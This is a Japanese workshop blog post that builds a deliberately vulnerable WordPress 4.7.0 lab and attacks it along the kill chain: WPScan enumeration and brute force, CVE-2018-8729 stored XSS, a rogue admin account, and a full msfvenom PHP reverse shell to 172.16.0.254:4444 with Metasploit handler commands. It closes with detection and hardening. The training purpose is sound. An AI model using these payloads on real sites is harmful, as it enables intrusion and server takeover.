---
layout: post
title:  "WordPress Build & Crack"
date:   2018-10-29
permalink: /security/:title
categories: Security
tags: WordPress Fiddler CVE-2018-8729 Metasploit WPScan
excerpt: WordPressの構築とクラッキング
mathjax: false
---

* content
{:toc}

# はじめに

このセッションではWordPressを題材にしてWebサイトを守る技術を学びます。

WordPressは誰でも簡単にスタイリッシュなWebサイトを構築できる素晴らしいCMSです。
W3Techsによると全世界のWebサイトのうち32%はWordPressで作成されているそうです。
一方でWordPressには非常に多くの脆弱性が発見されており改ざんの被害が後を絶ちません。
改ざんされたWordPressはマルウェアの配布に利用されることもあります。
Webサイトを防衛することは、サイバー空間の安全を維持し、サイトオーナーとユーザーの価値を最大化することに繋がります。

効果的な防衛を実現するためには、防衛対象の仕組みを理解した上で攻撃手段を理解しなければなりません。
まずは環境構築を通じてWordPressの仕組みを学びましょう。
次にサイバーキルチェーンに従っていくつかの代表的な攻撃手段を学びましょう。
最後に攻撃の痕跡がどのように残るのか検証し、効果的な防衛について議論しましょう。

# 免責
このセッションにはWordPressを改ざんする具体的なノウハウが含まれますが、読者に対して改ざん行為を推奨するものではありません。
Webページを改ざんするなどコンピュータや電磁的記録を破壊して業務を妨害する行為は、刑法234条の2である電子計算機損壊等業務妨害罪などにより、処罰の対象となります。
このセッションに含まれる内容を不用意に実施したことにより、読者が被ったいかなる不利益についても、当サイトでは責任を負いません。

# 環境構築

WordPressは次のコンポーネントから構成されます。

|コンポーネント|役割|
|:---|:---|
|PHP|データベースに基づきWebページを動的に生成する|
|Apache httpd|ブラウザからのリクエストを処理する|
|MySQL|ユーザーアカウントやサイトコンテンツを保存する|
|WordPress|Webサイトのひな型|

## PHP
```
# phpのインストール
yum install -y php php-mysql

# phpが動作することを確認
php -r 'print "hello world\n";'
```

## Apache httpd
```
# Apache httpdの起動
systemctl enable httpd
systemctl start httpd

# テストページの設置
echo "<?php phpinfo(); ?>" > /var/www/html/index.php
```

**ファイアウォール/SELinux**

検証環境を手早く構築するためにファイアウォールとSELinuxを停止しましょう。
余裕があれば、これらの適切な設定方法について学ぶのも悪くありません。
```
# ファイアウォールの停止
systemctl stop firewalld

# SELinuxの停止

setenforce 0
```

テストページにアクセスして動作確認しましょう。

![](/images/wordpress/phpinfo.png)

## MySQL(MariaDB)

WordpressのバックエンドDBのMySQLを用意します。
ここで作成するデータベース名、ユーザー名、パスワードは後で参照するので覚えておいてください。

```
# MariaDBのインストールと起動
yum install -y mariadb mariadb-server
systemctl enable mariadb
systemctl start mariadb

# データベースの初期化スクリプトを作成
cat > /tmp/init.sql << END
set password for root@localhost=password('rootpassword');
insert into user set user="wpadmin", password=password("wpadmin"), host="localhost";
create database wpdb;
grant all on wpdb.* to wpadmin;
flush privileges;
END

# データベースの初期化スクリプトを実行
mysql -u root -D mysql < /tmp/init.sql

# 以下の設定が完了したことを確認
# - rootユーザーのパスワードが変更されていること
# - wpdbデータベースが作成されていること
# - wpdbデータベースの権限を持つwpadminユーザーが作成されていること
echo 'select Db, User from db;'| mysql -u root -D mysql -prootpassword

# wpadminユーザーでログインできることを確認
echo 'show tables;'|mysql -u wpadmin -D wpdb -pwpadmin
```

次のようなエラーが返された場合はwpadminユーザーの作成に失敗しているので手順を再確認してください。

`ERROR 1045 (28000): Access denied for user 'wpadmin'@'localhost' (using password: YES)`

## WordPress Core
wordpress公式が古いバージョンのWordPressを配布しています。
利用する脆弱性に応じたWordPressを取得してください。

```
# wordpressのダウンロードと設置
curl https://ja.wordpress.org/wordpress-4.7-ja.tar.gz -o /tmp/wordpress-4.7-ja.tar.gz (11/20のワークショップ環境ではダウンロード済みです)
tar -zxvf /tmp/wordpress-4.7-ja.tar.gz -C /var/www/html/
mv /var/www/html/wordpress/ /var/www/html/4.7.0/

# アクセス権限をapache:apacheに変更
chown -R apache: /var/www/html/4.7.0
```
ブラウザからwordpressのパスにアクセスすると初期設定ウィザードが開きます。

![](/images/wordpress/setup-config.png)

MySQLに作成したデータベース名、ユーザー名、パスワードを指定します。

![](/images/wordpress/setupconfig2.png)

設定が無事終わればこの画面が表示されます。
まだインストール実行をクリックしないでください。

![](/images/wordpress/setupconfig3.png)

今回は脆弱性のある環境を構築するため、あらかじめWordpressの自動更新を無効化します。
設定ウィザードによって生成された`wp-config.php`に`define('AUTOMATIC_UPDATER_DISABLED', true);`という行を追記しましょう。

```
# Wordpressの自動アップデートを無効化
echo "define('AUTOMATIC_UPDATER_DISABLED', true);" >> /var/www/html/4.7.0/wp-config.php
```

自動更新を無効化したらインストール実行をクリックします。
ここで指定するユーザーがサイトの管理者になります。
パスワードを忘れないようにメモしてください。

![](/images/wordpress/setupconfig4.png)

サイトの情報を設定して`WordPressをインストール`をクリックすれば構築は完了です。
Hello world!にアクセスできることを確認します。

![](/images/wordpress/wpindex.png)

**データベースの確認**

WordPressのコンテンツはデータベースに格納されています。
mysqlにアクセスすることで投稿内容やユーザーデータを確認できます。
```
# wpdbデータベースにテーブルが増えている事を確認
echo "show tables;" | mysql -u wpadmin -D wpdb -pwpadmin

# 投稿に関する情報を確認
echo "select * from wp_posts;" | mysql -u wpadmin -D wpdb -pwpadmin

# ユーザー一覧を確認
echo "select * from wp_users;" | mysql -u wpadmin -D wpdb -pwpadmin

# ユーザー権限を確認
echo "select * from wp_usermeta where meta_key Like 'wp_capabilities';" | mysql -u wpadmin -D wpdb -pwpadmin
```

## WordPress Plugin

最後にプラグインをインストールしましょう。
これはWordPressに対するログイン履歴を確認するためのものです。
不正アクセスの有無をモニタリングしやすくなります。

**プラグインの取得**

XSSの脆弱性があるActivity Log Pluginのversion2.3.1を取得します。

```
yum install -y wget zip
cd /tmp
wget https://plugins.svn.wordpress.org/aryo-activity-log/tags/2.3.1/ -r -np
cd /tmp/plugins.svn.wordpress.org/aryo-activity-log/tags/2.3.1/
find . -name index.html | xargs -n 1 rm -f
zip -r /var/www/html/plugin.zip *
```

**プラグインのインストール**

![](/images/wordpress/plugin01.png)

![](/images/wordpress/plugin02.png)

# 攻撃

攻撃手段を理解するにあたってはフレームワークを活用しましょう。
[MITRE ATT&CK](https://attack.mitre.org/resources/enterprise-introduction/)によると情報システムに対する攻撃は7段階に分類されます。
この一連の攻撃はサイバーキルチェーンと呼ばれ、未知の攻撃だとしてもこの流れには従うとされています。
これからサイバーキルチェーンの一部を体験してみましょう。

## ターゲットの偵察

攻撃ステージはRecon（偵察）です。

WordPressが生成するHTMLソースからは様々な情報が読み取れます。
WoredPress Coreのバージョンや使用されているPluginのバージョン、その他にもサイトに存在するユーザーアカウント名なども分かります。
そのような情報を効率的に収集するツールとして`WPScan`が有名です。
自分で構築したWordPressに対して情報収集をしてみましょう。

ターゲットサーバに到達できるKali Linux上で操作することを想定しています。

```
# 基本的な情報を列挙する
sudo wpscan --url http://172.16.0.253/4.7.0/ --wp-content-dir wp-content

# ユーザーアカウントを列挙する
sudo wpscan --url http://172.16.0.253/4.7.0/ --wp-content-dir wp-content --enumerate u

# ユーザーアカウントを指定してパスワードリストの中から一致する物を全探索する
sudo wpscan --url http://172.16.0.253/4.7.0/ --wp-content-dir wp-content --usernames wpuser --passwords /var/opt/password
```

ブルートフォースを行う際は、質の良いパスワードリストの入手が課題になります。
[OpenWall](https://download.openwall.net/pub/wordlists/passwords/password.gz)が提供しているリストは基本的なワードが含まれていてコンパクトなので手軽に利用できます。
また、pastebinやgithub上に実システムから漏えいしたパスワードリストがアップロードされるている事もあります。

WordPressのバージョンや脆弱性のあるPluginの有無などの情報を収集できましたか？
ターゲットが複雑なパスワードを使用していなかった場合は、この時点で特権アカウントの情報も入手出来ているかもしれません。

## WordPress Coreの脆弱性

攻撃ステージはExploit（脆弱性の利用）です。

脆弱性とは何でしょうか。
それはバグが含まれる古いバージョンのソフトウェアや簡単に推測されるパスワードなどです。
あなたは事前の偵察によってターゲットの脆弱性を知ることが出来ました。
今からWordPress4.7.0が抱える脆弱性を利用してみましょう。

**REST APIとは**

WordPress4.7.0からREST APIによるコンテンツへのアクセスが実装されました。
それ以前にはWebブラウザからWordPressのダッシュボードにログインして記事を編集する必要があったのです。
REST APIが実装された事によってダッシュボードにログインしなくても同様の操作ができるようになりました。

試しにブラウザから次のURLにアクセスしてみましょう。
JSON形式の情報を得ることが出来たはずです。

```
http://localhost/4.7.0/index.php/wp-json/wp/v2/posts/
```

**REST APIの脆弱性**

WordPress4.7.0のREST APIには認証バイパスの脆弱性があります。
例えば以下のPOSTリクエストはWordPress4.7.0のHello World!ページを書き換えます。
[Fiddler](https://www.telerik.com/download/fiddler)等のローカルプロキシを使ってPOSTリクエストを送信してみましょう。

悪用を防ぐため[openssl aes-256-cbcで暗号化してあります。](https://gist.github.com/ox0xo/6e7a3477caf923ef7889ffe8843ccd7d)パスワードは弊社名の略称です。
```
U2FsdGVkX193yY0WXq/xfbjjLXY6fumwnxKRiYzQ7i3r+CX7aENXMdK52Z649OPddaaak/xbQKS7W8akxT6tdQ/jReGS8OVCuWFYM91iDh2fy8emdpBpGpM/kdrMRCbUpkMs1630RsWlS96QNJTiwVM6CL8RL4XlTDKlb7T6pj3z/S2mHghljWp73tBrKJfyGaZ7VMyxqNq80sbijplGXTe9tdsdPU6HM+n/ZCsNvcXvNS4MqG8P6709nGDaeEUIfmxzOUNJBulXChPCzhx1nQ==
```

![](/images/wordpress/fiddler02.png)

WordPressのユーザーアカウントを使わずにコンテンツを書き換えることが出来ました。
ただし`<script>`などの一部のタグは書き込むことが出来ません。
WordPressにはksesというセキュリティ機能が有り、XSSに繋がるような文字列が除去されるためです。
この脆弱性を使って出来ることは、フィッシングサイトを作成して閲覧者にリンクをクリックさせる事ぐらいでしょうか。

![](/images/wordpress/fiddler03.png)

## WordPress Pluginの脆弱性

攻撃ステージはExploit（脆弱性の利用）です。

あなたはksesの影響を受けずにXSSが出来るような手段を必要としています。
他に利用できる脆弱性は無いでしょうか？

このセッションでは、あなたはセキュリティ強化の一環としてActivity Logプラグインをインストールしたはずです。
実はこのプラグインにはXSSの脆弱性である[CVE-2018-8729](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8729)があります。
意図したとおりにActivity Log Pluginがインストールされていれば次の攻撃を試す価値があります。

悪用を防ぐため[openssl aes-256-cbcで暗号化してあります。](https://gist.github.com/ox0xo/6e7a3477caf923ef7889ffe8843ccd7d)パスワードは弊社名の略称です。

```
U2FsdGVkX1+coBOcBKCzqamqzRdhiX1JjgOV4C8E4yI9RaEtIXVyOLV057UnGTF79q30sZ85xxYwjpjy8C9SAgFmyNfoUZ0EaPHVUbj0P2z1vVOL/LFwLJ+I0sKOprBT0CLoopq448a3AJM2OocUas3tOdGanxZvYKwk5Q1cD4uKTlKp2vz70uNViueyTisAhKradz0YaeEO/7sVw8u9N/xqXUrZLe0CJl8bBLnKGM2vo4t4+eBHHMejBLc7f5ASrKUYazUzYpNVs/aJRronilUT13n4an0eI/kiZd3rgBSY9MkNklpYqnl9pkS4Zyj8
```

![](/images/wordpress/fiddler04.png)

攻撃に成功すればActivity LogにXSSを含むアクセスログが追記されます。
このログはWordPressの管理者にしか見えませんが、わざわざPluginをインストールするような管理者なら定期的に確認するはずです。
管理者がログを確認したタイミングで格納型XSSが起動します。

セキュリティを強化するPluginが攻撃の糸口になるとは皮肉なものですね。

![](/images/wordpress/log_activity01.png)

おっと、次のトレーニングに移る前に今注入したスクリプトを削除しておきましょう。
Activity LogのSettingsからReset Databaseを選択するだけです。

![](/images/wordpress/plugin03.png)

## 任意コード実行

攻撃ステージはExecution（攻撃コードの実行）です。

おめでとう！あなたはターゲットに不正なスクリプトを注入し、アラートを表示させることに成功しました！
でも、ちょっと待ってください。
現実の攻撃はこんなチュートリアルでは済みません。
ここからは、どのようなスクリプトを用意すればターゲットに致命的なバックドアを作成できるのかを学びます。

今回、注入したいスクリプトは次の通りです。
悪用を防ぐため[openssl aes-256-cbcで暗号化してあります。](https://gist.github.com/ox0xo/6e7a3477caf923ef7889ffe8843ccd7d)パスワードは弊社名の略称です。

```
U2FsdGVkX1+Rh7jbi2fXs9n9B5JhXI6qy+M8rW0VhErb+AM8ZkAfh9AxkBkqBtCjjr+UNy7Hd9c0bQn286AGW+aIYi+SZEUzFxhZLso3+sNAqbWv9JE5R3P4WyENMlfJKQZrpE76qj5ijJAEQATCMj6cPEXLXv1lTaNyFptwlJ0ZIynLJxqUGunKv8miYZXywT5MgNXbJt/0hX9ktfqnClcmOwH/XhI0mEoYHxOVoMtOc1rd8xJmB+SpLUombHH8M10Z5vRoU3m5VdrYZsbHJTP07LyTGCRZvMdqkyKQbUiYA9ouyibOg2WEIRdBNWRxtTH3vR0DE0X09nmS+e0p5iEQ16YP93fLLQtbgcmRyEAyLQaXHvS2DXAuwhFsx/osZ9h9dPu1s6IzdNv/JpQ9nJx9xViuht9AWMIryVPLMXtVT93UIUvKLlGslVpJLyPg5PghI1Lpc0PXgTNdlHuSFg==
```

ただしActivity LogのExploitで注入できるスクリプトの長さは1件あたり55byte以下です。
しかもダブルクォーテーションなどの一部の文字がサニタイズされてしまいます。
この制約下で攻撃を成功させるために次の戦術を採用することにしましょう。

1. スクリプトを配布するためのWebサーバを用意する
2. 172.16.0.254をWebサーバとして運用し/var/www/html/userXXX/ディレクトリにスクリプトを設置する
3. Activity Logに`<script src=http://172.16.0.254/userXXX/スクリプト></script>`を注入する

XSSを起動するにはActivity Logを表示する必要があります。
本来は管理者のアクセスを待つ場面ですが、このセッションではあなたが管理者に代わってXSSを起動してください。

ダッシュボードから 外観>テーマの編集>テーマヘッダー を確認するとXSSで注入されたphpコードが確認できます。
テーマヘッダーはWordPressのヘッダーを出力するためのphpファイルです。

![](/images/wordpress/xss02.png)

phpinfoの出力についてはセッションの最初に確認しましたね。
ダッシュボードを抜けて一般ユーザー向けのパスを確認すると次のような結果になるはずです。

![](/images/wordpress/xss01.png)

## 特権アカウント作成

攻撃ステージはPersistence（侵入手段の永続化）です。

任意コードが実行できたならターゲットを完全に掌握するまであと一歩です。
WordPressデータベースを操作してあなただけが使える特権ユーザーを作成してみましょう。

先ほど用意したスクリプトファイルを次の通り書き換えてください。
悪用を防ぐため[openssl aes-256-cbcで暗号化してあります。](https://gist.github.com/ox0xo/6e7a3477caf923ef7889ffe8843ccd7d)パスワードは弊社名の略称です。

```
U2FsdGVkX1+Mn1G3w4qyPcrWxSv1Sib9H0mGpu2lH9orK29TGj6JFrCUafxg2L5djqY4CZMh94LKcga7bihYDe1qQPfEoSArMHlAAXBRQX6uHjgQQ9cllgbtuKOyBHiE9E114+OWomx0yOblLEcfIJkiDGKsgNQV0QrVMlOXSfJ7H2lHoTUb/vlWAfwfv6WPfy87ee5QUqdLyeibbAizZOHgxkGcQ1ZZXNkr4ypFCIvJPOYrNmDXVqgXVU08huuhM3WqoIUURmZG5wUaGHAOOCpzV1bxd5FKIslwyxxjdCfqnx/ovwrqR8I8hv9LEaUIe0rv9Y9Fqm9gzW6riWkDI+SUsAvcjLi4Ks/EXkoJXc/+DOc7app6PaZCsnaoGUwRv+Txir0wHNm0n4b6QQYRL6TyTyPaDAgUGJqOlD0CqDFjjUfUseA5zPoWTV0G6r1RE9/j6iCfcPMJN/6dIsgWE8NZVUdEdhjc4+uD7JMMGLPIs+CKG3fLHLdoxrvsLTbD+z3PHRHtUYYciXxCnP18Or1k3/jCCMNajnElThDR4KymI5ZyXGv05xuhEaD+YdGEJ8ZSieBqxjTjksDj95Q1vJm41KNO2/RJC0d5xBYKYX/cP94wajaZO4VxEI0f4y+0TDlquo4NTF3RtGvL854PUo7zZ0oG+MP3XWF+F9/F55xjlFMptsMNmf+1bNf2GyXvvpoovesVgyPzELnKaW4Y6ThoyaYVOfUWvMNmNeB3gmiADOij2NOK8psldfnCuszXPHmJbcaLnZifyLNXG9P3SrN8xPV/dR2Di0W8qL8dMyZ+haGDe5vhwXj0Xuhvx6YAgez+DstUteB+11y2uQvRw2M3xdMOKHZlF2XnaGJXbTT+1nBEplpS7keqvGMGQKZZziqzwT2J/CitQKkIyDShg6JYDebs4fWKA4RvaRx7va89AsP4XLTO7eEhAkAsvRc25N5elxMCoji1Rx584hCm5TE4pXQ5vRQhSsXaTdH2/f8LCR68soQqx9pYPfdZ6uqn8Clkaz8uMyI+T7yE9JKXc8PBHwSllNKidEjp4+GtmCr4xxXh7rANHJoA05cYI1cwf62NF8NP6FWkE2pnyCyrlWFV6ByDjI+kTffm+K32PkfoLSKBpWwF14Z2i8t9TN62n3T73x+H6HawoPSuMwKz+j7dvu5jw2FJlJFmbgsQRG2HDOJizL9OO8jEJtS+oCPiqqCmUonD/4G3TJU0InLINlq5UtJGQPKQsQQX6O9grcddGhhBEKhy02FlDRCmi0MQ
```

Activity LogからXSSを起動し、何らかのページに含まれるテーマヘッダを表示させたら、WordPressから一旦ログアウトしてください。
そして、今作った特権ユーザーアカウントでWordPressにログインできることを確認しましょう。

![](/images/wordpress/xss03.png)

無事ダッシュボードに辿り着いたなら、あなたはこのサイトを支配下に収めたということです。
この先何をするのかはあなたの想像力にかかっています。

![](/images/wordpress/xss04.png)

## リバースシェル

攻撃ステージはCommand and Control（ターゲットの掌握）です。

リバースシェルを設置すればターゲットをOSレベルで支配することが出来ます。
Kali Linuxを起動してphpのリバースシェルを生成しましょう。
次の例ではC2サーバが172.16.0.254:4444でコネクトバックを待ち受けることを想定しています。

複雑なコードなのでXSSを介して書き込むことは難しいかもしれません。
あなたは既に特権ユーザーとしてダッシュボードにログインすることが出来るはずです。
404.phpなどを編集して直接phpコードを書き込みましょう。

**リバースシェルの生成**
```
sudo msfvenom -p php/meterpreter/reverse_tcp LHOST=172.16.0.254 LPORT=4444 -f raw

↓ 出力結果

/*<?php /**/ error_reporting(0); $ip = '172.16.0.254'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
```

![](/images/wordpress/reverse01.png)

**C2サーバの起動**

リバースシェルを設置したらC2サーバの準備をしましょう。
Kali LinuxでMetasploitを使ってreverse_tcpを起動します。

```
sudo msfconsole
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 172.16.0.254
set LPORT 4444
exploit
```

![](/images/wordpress/reverse02.png)

**リバースシェルの起動**

すべての準備は整いました。
Webブラウザからリバースシェルが設置されたphpファイルにアクセスしましょう。

![](/images/wordpress/reverse03.png)

Metasploitのコンソールを確認するとコネクトバックが成立していることが分かります。
`shell`コマンドを実行すればターゲットのシェルを奪えます。

![](/images/wordpress/metasploit.png)

# 検知と防衛

WordPress Codexが提供する[Wiki](https://wpdocs.osdn.jp/WordPress_の安全性を高める)にセキュリティ向上のためのベストプラクティスがまとめられています。
いくつかの防衛策を試してみましょう。

## httpd

ブルートフォースや攻撃の試行錯誤により短時間でアクセスが集中することがあります。
このような不審なアクセス記録をWebサーバのアクセスログから確認します。

```
egrep wp-login.php /var/log/httpd/access_log

10.0.2.2 - - [08/Nov/2018:22:15:03 +0900] "POST /4.7.0/wp-login.php HTTP/1.1" 200 3289 "-" "Fiddler"
10.0.2.2 - - [08/Nov/2018:22:30:56 +0900] "POST /4.7.0/wp-login.php HTTP/1.1" 200 3289 "-" "Fiddler"
10.0.2.2 - - [08/Nov/2018:22:31:39 +0900] "POST /4.7.0/wp-login.php HTTP/1.1" 200 3289 "-" "Fiddler"
```

.htaccessを使えば攻撃の糸口になるようなファイルへのアクセスを制限する事が出来ます。
Filesタイプのdeny from allディレクティブを定義すれば、ローカルホスト以外のログイン試行を防ぐことが出来ます。

```
# /var/www/htmlのAllowOverrideパラメータをAllに変更する
vim /etc/httpd/conf/httpd.conf

<Directory "/var/www/html">
  AllowOverride All

# httpdを再起動する
systemctl restart httpd

# .htaccessにアクセス制御を追記する
vim /var/www/html/4.7.0/.htaccess

<Files ~ "^wp-login.php$">
  deny from all
</Files>
```

## MySQL

攻撃が上手くいかなかった場合にエラーが出力されることがあります。
次のログにはテーブルの主キー制約に触れたためINSERTクエリが失敗したことが記録されています。
これは既存データの有無を確認しなかった攻撃者のミスです。

```
egrep INSERT /var/log/httpd/error_log

[Sat Nov 10 21:17:26.322692 2018] [:error] [pid 12148] [client 10.0.2.2:49708] WordPress \xe3\x83\x87\xe3\x83\xbc\xe3\x82\xbf\xe3\x83\x99\xe3\x83\xbc\xe3\x82\xb9\xe3\x82\xa8\xe3\x83\xa9\xe3\x83\xbc: Duplicate entry '9999' for key 'PRIMARY' for query INSERT INTO `wp_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (9999, 999, 'wp_capabilities', 'a:1:{s:13:\\"administrator\\";b:1;}') made by require('wp-blog-header.php'), require_once('wp-includes/template-loader.php'), include('/themes/twentyseventeen/index.php'), get_header, locate_template, load_template, require_once('/themes/twentyseventeen/header.php')
```

## WordPressテンプレート

テンプレートファイルの更新日時から改ざんを確認できることがあります。
次の例では攻撃者が改ざんした404.phpとheader.phpの更新日時が最近のものに書き換わっていることが分かります。

```
pwd
/var/www/html/4.7.0/wp-content/themes/twentyseventeen

ls -lat
合計 524
-rw-r--r--. 1 apache apache   1113 11月  8 23:54 404.php
-rw-r--r--. 1 apache apache   2011 11月  8 23:43 header.php
drwxr-xr-x. 5 apache apache     88 12月  7  2016 ..
drwxr-xr-x. 5 apache apache   4096 12月  7  2016 .
```

WordPressにはテンプレートの改ざんを防ぐためのオプションが用意されています。
wp-config.phpにDISALLOW_FILE_MODSを追記することで、ダッシュボードからテーマを編集できなくなります。

```
echo "define('DISALLOW_FILE_MODS',true);" >> wp-config.php
```

![](/images/wordpress/security01.png)

## ネットワークパケット

ネットワークパケットを取得していればさらに詳細な分析が出来ます。
次のパケットはREST APIの脆弱性を突いた攻撃の最中に取得したものです。
通常のアクセスとは異なるUser-Agentが使われています。
パケットを展開してHTTPヘッダを精査すれば不審なデータが送信されていることも確認できます。

![](/images/wordpress/pcap01.png)

次のパケットはWPScanによる脆弱性スキャンの最中に取得したものです。
1秒間に大量のGETリクエストが送信されています。
WordPressの設定ファイルをバックアップしたまま放置していたらこのスキャンで検知されてしまいます。

![](/images/wordpress/pcap02.png)

次のパケットはリバースシェルにアクセスしている最中に取得したものです。
ストリームインデックスが変わらないことに注目してください。
リバースシェルの操作中はTCPコネクションが維持されるため長時間にわたってTCPセッションが継続します。

![](/images/wordpress/pcap03.png)

80秒後にセッションが終了しました。
通常のHTTPアクセスと比較すればこの時間がどれほど長いのか理解できます。

また、C2サーバから送られるパケットにPSHフラグが立っている事にも注目してください。
PSHは送信したパケットをバッファから速やかにフラッシュさせるためのフラグです。
コマンドに対して即座に応答を返す必要があるTELNETなどのアプリケーションで用いられます。

![](/images/wordpress/pcap04.png)

リバースシェルに関するパケットが平文で送受信されている場合は内容を読み取ることが出来ます。

![](/images/wordpress/pcap05.png)

ITシステムの多くがネットワークに接続されている現状においてネットワークパケットの分析は防御側に非常に大きなアドバンテージをもたらします。
ネットワークパケットはログに比べてサイズが大きく分析の手間もかかるため[RSA Netwitness](https://www.rsa.com/ja-jp/products/threat-detection-response/rsa-netwitness-logs-packets)や[NetAgent PacketBlackHole](http://www.packetblackhole.jp/)のようなフォレンジックツールの採用が望まれます。

# まとめ

あなたはこのセッションを通じてWordPressでWebサイトを構築する最低限のノウハウを得ました。
WordPressはPHPで書かれたWebアプリケーションでありバックエンドにMySQLを利用しています。
今回はApache httpdにデプロイしましたがNginxやIISでも動かすことが出来ます。
Webサーバを覚えるのに最適な教材なので積極的に検証を重ねてください。

あなたはサイバーキルチェーンの概念を知りWordPressに対する具体的な攻撃手段の一部を知ることが出来ました。
サイバーキルチェーンは偵察から始まり、いくつかの段階を経てターゲットを掌握し最終的な目的を達成します。
筆者はその中でも特に重要な攻撃ステージは特権アカウントの獲得だと考えています。
どんなシナリオなら特権アカウントを獲得できるか考えてみてください。
githubやexploit-dbを探せばヒントは沢山見つかります。

あなたはWordPressに対する攻撃を防ぎ、万が一攻撃を受けたとしても検知する方法を知りました。
Webサーバを要塞化するにはやはりWebサーバの設定やアプリケーションの脆弱性を知り尽くす必要があります。
攻撃のシナリオを立てつつ、それに対する防衛策を調べてみましょう。
